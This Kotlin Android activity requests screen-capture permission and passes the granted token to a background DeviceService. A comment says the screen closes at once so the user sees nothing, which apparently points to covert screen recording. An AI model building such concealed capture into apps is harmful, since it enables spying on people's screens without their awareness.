package com.sync.xxx

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle

class ScreenCaptureActivity : Activity() {

    companion object {
        private const val REQ_SCREEN = 1001
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        @Suppress("DEPRECATION")
        startActivityForResult(mgr.createScreenCaptureIntent(), REQ_SCREEN)
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == REQ_SCREEN) {
            val intent = Intent(DeviceService.ACTION_SCREEN_RESULT).apply {
                putExtra(DeviceService.EXTRA_RESULT_CODE, resultCode)
                putExtra(DeviceService.EXTRA_RESULT_DATA, data)
                setPackage(packageName)
                addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
            }
            sendBroadcast(intent)
            // Langsung close, user tidak lihat apa-apa
            finish()
        }
    }
}